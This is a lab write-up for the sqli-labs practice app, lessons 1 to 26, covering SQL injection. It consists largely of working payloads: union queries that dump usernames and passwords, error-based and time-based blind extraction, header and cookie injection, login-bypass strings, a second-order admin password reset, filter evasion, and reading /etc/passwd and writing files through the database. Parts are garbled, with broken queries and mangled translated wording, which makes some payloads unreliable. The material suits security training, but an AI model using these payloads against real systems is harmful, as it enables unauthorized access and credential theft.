# sqli_labs
## lesson1
### Error-Based: Single Quotes,String
  * ?id=1 or any other number gives the respective username and password, similar to the query: select * from TABLE where id=1;
  * In the url after trying some special cases, we find that odd number of single quotes breaks the query and also string input throwing error.
  * Error:  right syntax to use near ””) LIMIT 0,1′ at line 1.
  * ?id=1′)–-+  : this gives us back the username and password. (here -- is used to comment out rest of the things).
  * Commonly used injections like ' OR '1'='1--
  * OR '1'='1' /*  in url after execution it would be like ?OR%20%271%27=%271%27%20/*
  * ?id=-1' union select 1,2,database() --+
  * SELECT username,password from 'users' WHERE '?id'=0 OR 1=1; (here 1=1 is equivalent to true).
  * SELECT username,password from 'users' WHERE ?id=9 trying out different id no.s we get the desired output when id is 9.
  * Query: select * from users where id='-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database();-- -
  * URL : ?id=-1 union select group_concat(username)group_concat(password) from users;-- -   (dump databse)



## lesson2
### Error-Based: IntegerBased
  * when we give ?id=1- we see the error as right syntax to use near'LIMIT 0,1' at line 1 (query broke)
  * error that extra " and 'quotes are present which means that the input is enclosed in them.
  * Select * from TABLE where id = 1’ ;
  * so there is use of integer for the query
  * Select * from TABLE where id = (some integer value);
  * SELECT username,password FROM TableName WHERE id=1--;
  * if we comment out the id number as (-- is used to comment out the input): http://localhost/sqli-labs/Less-2/?id=1 -- 
  * we receive the username and password.

## lesson3
### Error-Based: Single quotes (string)
  * when we give ?id=1- we see the error as right syntax to use near ””) LIMIT 0,1′ at line 1 (query broke)
  * Select login_name, select password from table where id= (‘our input here’)
  * So again we inject the code with this ?id=1′) -–+'    
  * we get back the output username and password.

## lesson4
### Error-Based: Double quotes (string)
  * After some unsuccessful attempts, we perform an error-based double quotes attack
  * ?id=1’’ injecting the code we can see a username and password.
  * we try to dump the database to retrieve some sensitive information. 
  * So here we use the union select command to dump the database like this: ?id=1’’) union select 1,2,3 –+
  * (here 1,2,3 is used since we assume 3 columns there, u can also try with 1,2)
  * Now we start mysql to dump database:
  * show databases;  -->to show databases
  * use security;  -->this helps to use the database security(which has important information)
  * show tables;  -->this helps to view the table, we can see four tables like users,emails,referers,uagents
  * We use system database, which is information_schema using the command: use information_schema;
  * See tables using "show tables;" command
  * Query : select table_name from information_schema, tables where table_schema = “security”;
  * inject the same query into the URL : ?id=1”) union select 1,table_name,3 from information_schema.tables where table_schema=’security’ --+
  * Query : ?id=1”) union select 1,group_concat(table_name)3 from information_schema.tables where table_schema=’security’ – -+  
  * (group together all the table names and dump it out as a string)
  * Query : ?id=1′ union select 1,group_concat(username),group_concat(password) from users –+

## lesson5
### Fixing the query without using comments
  * Error-based double quotes injection attack as shown below.
  * when ?id=2 or any other integer we get the message you are in ....
  * it is not similar to username and password as shown before
  * by giving the single quotes query gets broken, to see the developers format of query, we use escape character(\)
  * Query : ?id=1′ AND ‘2 (OR) ?id=3′ AND ‘4
  * 
  * After injecting this type of code, the database always shows different usernames and passwords.
  * URL : ?-6′ union select 5,current_user,3 AND ‘1
  * We use this query for getting the current username.

## lesson6
### Double quote injection
  * ?id=2 try giving in the url 
  * Injecting the query, we can see an sql error message on the screen.
  * We start from the count function, which just returns us the number of rows.
  * select count(*) from informatio_schema.tables;
  * select rand(); --> gives random values between 0 and 1
  * select floor(); -->  prints the integer part alone
  * select floor(rand()*2)as dumb; --> gives either 0 or 1 as output
  * select table_name, table_schema from information_schema.tables group by table_schema; --> can see only email under security database
  * Dumping the database in the form of a sql error:
     - select concat((select database()))  --> used to dump the string
     - select concat(0x3a,0x3a,(select database()),0x3a,0x3a)  --> here 0x3a is for quote
     - select concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a  --> renamed as a
     - select concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.columns
     - select count(*), concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a;
     - select count(*), concat(0x3a,0x3a,(select table_name from),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a;
     - select count(*), concat(0x3a,0x3a(select version()),0x3a,0x3a, floor (rand()*2)) a from information_schema.columns group by a; (dump version)
     - select count(*), concat(0x3a,0x3a(select user()),0x3a,0x3a, floor (rand()*2)) a from information_schema.columns group by a; (dump user)

## lesson7
### Using out file dump database
  * ?id=1′–+  (sql query broke)
  * use security;
  * select * from users;
  * select * from users limit 0,1 into dumpfile “/tmp/test2.txt”  (for dumping the database)
  * select load_file(“etc/passwd”);  (for loading files from the file system into mysql)
  * select load_file(“etc/passwd”) into outfile “tmp/test4.txt”; (combination of the above 2)
  * query will be : ?id=2′)) union select 1,2,3 into outfile “/var/www/sqli-labs/Less-7/union2.txt” –+
  * checking the Less-7/union2.txt file after this gives us the data or info as output

## lesson8
### Blind sqli Boolean-based single quotes
  *  Injecting some queries we see that we do not have an error message on the screen. 
  *  We are not sure here that the injection exists on this page or not, that's why this type of injection is called blind injection. 
  *  There are two types of blind injection, Boolean-based and Time-based injections.
  *  use security;
  *  select length(database());
  *  select substr(database(),1,1); --> substring is a part of the string
  *  select ascii(substr(database(),1,1)); --> ans:115 (s) (to get the ascii value of the substring)
  *  select ascii(substr(database(),2,1)); --> ans:101 (e) (like this we can find character one by one)
  *  select ascii(substr(database(),2,1)) = 101;  --> value returned is true
  *  select ascii(substr(database(),2,1)) < 101;  --> returns false since ascii value not less than 101
  *  ?id=1′ AND (ascii(substr((select database()) ,3,3)) = 99 --+  (this query is true, so message like 'you are in ....' is printed)
  *  for any other invalid value it gives no message as before
  *  id=1′ AND (ascii(substr((select table_name information_schema.tables where table_schema=database()limit 0,1) ,1,1)) = 101 –+  (message you are in...)
  *  so 1st letter is e as value is 101, e stands for email

## lesson9 and lesson10
### Blind sqli Time-based single quotes
  * In this lesson we can't see an error that we have tampered the query, which results in Mysql error. 
  * So now it makes us check whether SQL injection is possible and we will also use sleep command in mysql.
  * Query select if((select database()=”security”, sleep(10), null); we get the response 10s after sleep, giving us the result that a database security exists.
  * This is also known as a time-based SQL query. 
  * Similarly if we try to run the query select if ((select database()=”securi”, sleep(10), null); 
  * There is no time-based response from the SQL server which means that such a database does not exist.
  * Now we do the same thing in our browser query.
  * We alter the parameter with ?id=1′ and ((select database()=”security”, sleep(10), null);
  * There is a waiting response from the browser. Since the query was able to detect the database it gives us the response. 
  * If the database name were incorrect, we would not have got a waiting response.

## lesson 11 & 12: 
### Post Error-based single & double quotes
  * There is a login page and we try to login using a username as admin and password as some random value. Couldn't login.
  * Now login, using username and password as single quotes. Couldn't login. Similarly, the failed login error appears for double quotes for both username and
  * password. But when we enter a double quote for just the username the SQL breaks and has an error.
  * Using a backslash (/) we get a better understanding of the query. We come to the result that we have a double quote followed by the bracket. 
  * Hence we have successfully derived the query. 
  * So the knowledge we take out from this result is that the developer has used the query
  * Select * from TABLE where username= (“$uname”) and password=(“$password”) LIMIT 0,1
  * Now in order to fix the query so that it works, we can balance the quotes or comment out the rest of the query. 
  * So I comment out the rest of my query in the username field
  * Now as I press enter, it becomes a valid query though we are not able to login and it does not give us an error message.
  * Now we alter the username to “) or 1=1 #: And we are successfully able to login.
  * Similarly, we may get the records for the second user through the username “) or 1=1 LIMIT 2,1 #
  * The query simply checks for the second OR condition, validates the user, and prints the record of the second row.

## lesson 13 & 14: 
### Double-injection single quotes with string
  * It uses the same mechanism as we have used in this lab.
  * Inputting a large number or a single quote as a username and password does not work. 
  * It still gives us a “Login Attempt Failed” message.Now we try the double quotes in the username and voila, the query breaks.
  * So what we can infer from this error message is that there is ‘ “/” and password=” ” LIMIT 0,1 ‘ at line 1
  * Now we use ” or 1 # to bypass the login and we have success. The reason is that the 1 used after OR resolves to true and as a result we have successful query.
  * The password is not matched since we commented out the rest of the query.
  * Now we move on to the next query, which is
  * Select concat((select database()));
  * This basically selects the database and dumps it as a string. If we add the floor and random function to it, it becomes
  * select concat((select database() ), floor(rand(0)*2 ));
  * And we have security being concatenated in the output:
  * We use the information schema table as covered previously to build our query further:
  * select 1 from (select concat(*), ( concat((select database() ), floor(rand(0)*2 ))c from information_schema.tables group by c)a;
  * And we use it on the username. Please remember to concat your query so that the query gets executed.

## Lessons 15
### Blind Boolean time-based with single and double quotes.
  * So now we move on to POST Parameter Blind-based Boolean injections which are like 1 or 1=1,
  * 1 AND 1=1, which means for the first query we have the Boolean value 1 and for the second we also have the Boolean value 1, which equals to TRUE, since an AND function is involved. In order to bypass the lab session 16 we use “) or (“1”)=”1 for bypassing the login. 
  * We comment the query by using # if we just want to enter the username.
  * Now we move on to our next demonstration using Boolean-based blind SQL injections. This time we form the query “) or AND sleep(15) #
  * but the query gets no response. We try to correct our query by using “) or OR sleep(15) #
  * The query eventually becomes select col1, col2 from TABLE where username= (” “) or sleep(15)”) and password=(” user data”);
  * Now since the “) does not result in TRUE, the AND statement fails and the OR statement executes successfully. 
  * Now if we change our AND query to admin”) or OR sleep(15) # we have a valid query and it results in TRUE, so our query gets successfully executed.
  * less-15 POST-Blind- Boolian/time Based-Single quotes (based on bool/time delayed single quote POST blind)
  * Blind-based on Boolean-string
  * There is no response to any input, so time delay.
  * Boolean test payload
  * uname=admin' and 1=1 --+&passwd=admin&submit=Submit //Login successful
  * uname=admin' and 1=2 --+&passwd=admin&submit=Submit //Login failed
  * Time delay test payload
  * uname=admin' and sleep(5) --+&passwd=admin&submit=Submit
  * Obvious delay, make sure to use delayed injection.
  * Manual delay injection is the most deadly.
  * Explode the library, table, column name, value, give it once.
  * uname=admin' and if(length(database())=8,sleep(5),1)--+&passwd=admin&submit=Submit
  * uname=admin' and if(left(database(),1)='s',sleep(5),1)--+&passwd=admin&submit=Submit
  * uname=admin' and if( left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)='r' ,sleep(5),1)--+&passwd=admin&submit=Submit
  * uname=admin' and if(left((select column_name from information_schema.columns where table_name='users' limit 4,1),8)='password' ,sleep(5),1)--+&passwd=admin&submit=Submit
  * uname=admin' and if(left((select password from users order by id limit 0,1),4)='dumb' ,sleep(5),1)--+&passwd=admin&submit=Submit
  * uname=admin' and if(left((select username from users order by id limit 0,1),4)='dumb' ,sleep(5),1)--+&passwd=admin&submit=Submit
## Lesson 16 
### POST-Blind- Boolian/Time Based-Double quotes
  * No matter how I enter this question in the login box, there is no error message displayed, and the guess is that the delayed blind.
  * Method one, time delay injection
  * The payload is similar to less-15, just change the single quotation marks from the previous question to double quotation marks and parentheses ") and you're done.
  * Method two: kinky tricks:
  * Universal account bypass password verification: admin")#
  
## Lesson 17 
### POST-Update Query- Error Based-String
  * checking the php file:
  * Obviously, check_input is processed for uname here, check_input() function is as follows

```
function check_input($value)
	{
	if(!empty($value))
		{
		// truncation (see comments)
		$value = substr($value,0,15);
		}
 
		// Stripslashes if magic quotes enabled
		if (get_magic_quotes_gpc())
			{
			$value = stripslashes($value);
			}
 
		// Quote if not a number
		if (!ctype_digit($value))
			{
			$value = "'" . mysql_real_escape_string($value) . "'";
			}
		
	else
		{
		$value = intval($value);
		}
	return $value;
	}
```
  * Intercept only 15 characters get_magic_quotes_gpc()
  * When magic_quotes_gpc=On, the function get_magic_quotes_gpc() will return 1
  * When magic_quotes_gpc=Off, the function get_magic_quotes_gpc() will return 0
  * The function of magic_quotes_gpc function in php is to judge the data parsed by the user. 
  * For example, the data from post, get, cookie includes the escape character "\" to ensure that these data will not cause the program, especially the database statement because of the special Fatal errors due to pollution caused by characters.
  * In the case of magic_quotes_gpc = On, if the input data has
  * Characters such as single quotes (’), double quotes ("), backslashes (\), and NULL (NULL characters) will be backslashed.
  * stripslashes() removes backslashes added by addslashes() function
  * ctype_digit() judges whether it is a number, it returns true if it is a number, otherwise it returns false
  * mysql_real_escape_string() escapes special characters in strings used in SQL statements.
  * intval() integer conversion
  * For password blasting:
  * Use updatexml(), which is a brother to extractvaule(). The following test version() returns the mysql version:
  * Explosion library payload (pic)
  * Burst table name payload (pic)
  * Burst listing payload (pic)
uname=admin&passwd=admin' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users' and column_name not in ('user_id','user','first_name','last_name','avatar','last_login','failed_login')),0x7e),1) --+ &submit=Submit
  * Burst value payload (pic)
Use: uname=admin&passwd=admin' and updatexml(1,concat(0x7e,(select group_concat(password) from users),0x7e),1) --+ &submit=Submit     [not found]
  * Add a layer of select to try,
uname=admin&passwd=admin' and  updatexml(1,concat(0x7e,(select password from (select password from users where username='admin'))),1) --+ &submit=Submit
  * Check it and add a name, it's done. Final payload:
uname=admin&passwd=11'  and  updatexml(1,concat(0x7e,(select password from (select password from users where username='admin') mingzi ),0x7e),1) --+&submit=Submit

  * Can also be used:
uname=admin&passwd=11'  and  updatexml(1,concat(0x7e,(select password from (select password from users limit 7,1) test ),0x7e),1) --+&submit=Submit

## Lesson 18 
### POST-Header Injection-Uagent field-Error based
  * Seeing the echo of user-agent, I guess the injection point is in user-agnet, which can be tested directly, but let me go and see the php file:
  * I’m relying on it. What did you say? The last question also said that passwrod didn’t do the check, so I did it.
  * Seeing the insert statement again, he inserted the user-agent into the database, so he can start from here, and it can be seen that it is a single quote type, and then he started to explode.
  * Capture the packet and modify the user-agent to the payload.
  * Test burst library payload  'and extractvalue(1,concat(0x7e,(select database()),0x7e)) and '
  * No problem, you can blast steps are exactly the same as the previous error injection,
  * Payload can be seen, less-12 double quotes error injection, only need to change the double quotes to single quotes can be used as the payload.
  * Sample burst library payload:
  * User-Agent:'and extractvalue(1,concat(0x7e,(select database()),0x7e)) and '

## Lesson 19 
### POST-Header Injection-Referer field-Error based
  * This question is very similar to the previous question. The echo is referer. 
  * Check the php file to find that the referer is inserted into the database in the insert statement, so the injection point is changed to referer. 
  * The paylaod is exactly the same as the previous question.
  * Sample burst library payload:
  * Referer:'and extractvalue(1,concat(0x7e,(select database()),0x7e)) and '

## Lesson 20 
### POST-Cookie injections-Uagent field-Error based
  * After login page:
  * Check out the php file,
  * You can see that the query statement queries cookee, then we will inject in cookies
  * Take a look at the package:
seecookie：uname=admin No problem is cookie injection
  * Price list quotes found:
A grammatical error broke out, which can be seen as a single quote.
  * Add it to check the number of rows
Cookie: uname=admin' order by 3--+ //1-3 normal
Cookie: uname=admin' order by 4--+ //4 is abnormal, make sure the number of rows is 3

  * Explosion library payload
Cookie: uname=-admin' union select 1,2,database()--+
  * The following is a repetitive step. You only need to modify the payload in the third query position to complete the SQL injection. 

## Lesson 21
### Cookie Injection- Error Based- complex-string
  * Base64 encoding, single quotes, error type, cookie type injection.
  * This level is similar to less-20, except that the cookie's uname value is base64 encoded.
  * After login page: The circled area is obviously encrypted with base64, and decoded: admin is the uname just logged in, 
  * so guess: this question encrypted the string at the cookie,
  * This is indeed the case when viewing php files, so you only need to encrypt base64 when uploading paylaod.
  * Seeing that the cookie is YWRtaW4%3D, which is not the same as the page display, but obviously %3D is the result of the = number urldecode.
  * Payload : admin' and 1=1 --+ //plain text
  * YWRtaW4nIGFuZCAxPTEgLS0r //Ciphertext
  * After many tests, --+ is not easy to use here, you need to use # to comment.
  * Example burst library paylaod: -admin') union select 1,2,database()#
  * LWFkbWluJykgdW5pb24gc2VsZWN0IDEsMixkYXRhYmFzZSgpIw==
  * Only need to modify the third query statement, which is the same as less-20 (note the # comment, not --+), as long as base64 is encrypted and written into the cookie.

## Lesson 22
### Cookie Injection - Error Based- Double Quotes-string
  * Same as less-21, just use double quotes instead of single quotesRemove the brackets.
  * Sample payload  -admin" union select 1,2,database()#
  * LWFkbWluIiB1bmlvbiBzZWxlY3QgMSwyLGRhdGFiYXNlKCkj

## Lesson 23
### GET-Error based-strip comments
  * Seeing that the available comment characters have been replaced, so we construct a closed statement:
  * Explosion library payload
  * ?id=' union select 1,2,database() '
  * ?id=' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() or '1'= '
  * ?id=' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' or '1'= '
  * ?id=' union select 1,group_concat(username),group_concat(password) from users where 1 or '1' = '

## Lesson 24
### Second Degree Injections -Store Injections
  * Secondary injection

Our steps are

1. Register an admin'# account.
2. Log in to admin'#, and modify the password of the account. At this time, the password of the admin is changed, and I changed it to 123456.

Sql statement becomes UPDATE users SET passwd="New_Pass" WHERE username ='admin' # 'AND password='

That is, the UPDATE users SET passwd="New_Pass" WHERE username ='admin'
If successful, the page will promptPassword successfully updated

3. Use the password I just changed to 123456. Log in to the admin account and you can log in successfully.

## Lesson 25
### Trick with OR & AND (filtered or and and)
  * OR & AND deception

have a test
Seeing single quotes around id,

However, the second payload has no errors and can be injected.

Method one, --+ bypass, general injection.

Sample payload

?id=-1' union select 1,2,database()--+
It is necessary to say that this question processed the password when the value was burst, query the password column, and echo no column passwd, so double-write or bypass

The same goes for information.

Sample payload
?id=-1' union select 1,2,group_concat(username,0x7e,passwoorrd) from users--+

Method two, double write or or and bypass

Test payload
?id=0' oorr 1=1 --+
?id=2' aandnd 1=1 --+
or and form a closed statement, sql query.
  * Less-25a Trick with OR & AND Blind (filtered or and and blind)

So how to judge that the and and or are filtered by the blind bet, add or or directly in front
Different from the 25 level is that there is no'' inclusion for id in the SQL statement, and there is no error item output, and error injection cannot be used. The rest is basically the same as the 25 example.
Two methods are adopted here: delayed injection and joint injection.
?id=-1%20||%20if(length(database())=8,1,sleep(5))#
?id=-1%20union%20select%201,database(),3#

## Lesson 26
### Trick with comments and space (filtered comments and space injection)

Comment deception

Test for half a day, no progress, check the php file
You can see that the function blacklist($id) comes to filter the whole family bucket, and the single quotes around $id, or, and, /*, –, #, space, /

*********************************************************************************************************************************

At this point, there is a problem. From this question to 28a, the injection fails. It is estimated that this is the case. The uncomfortable thing is that my linux virtual machine has a problem. It has not been done yet.

Note: Some friends at this level may not be able to use some special characters to replace spaces under windows. This is because of the apache parsing problem. Please change toLinuxUnder the platform.

 

*************************************************************************************************************************************
?id='%a0uNion%a0sElect(1),(database()),(3) or (1)='1 burst database
 ?id='%a0uNion%a0sElect(1), (group_concat(table_name)), (3)%a0from%a0information_schema.tables%a0where%a0table_schema='security'%26%26%a0%271%27=%271 Table
 ?id='%a0uNion%a0sElect(1), group_concat(column_name), 3%a0from%a0information_schema.columns%a0where%a0table_schema='security'%a0%26%26%a0table_name='emails'%26%26%a0 %271%27=%271 burst
 ?id='%a0uNion%a0sElect(1), group_concat(email_id), 3%a0from%a0emails%a0uniOn%a0seLect (1), 2,'3 Extract data






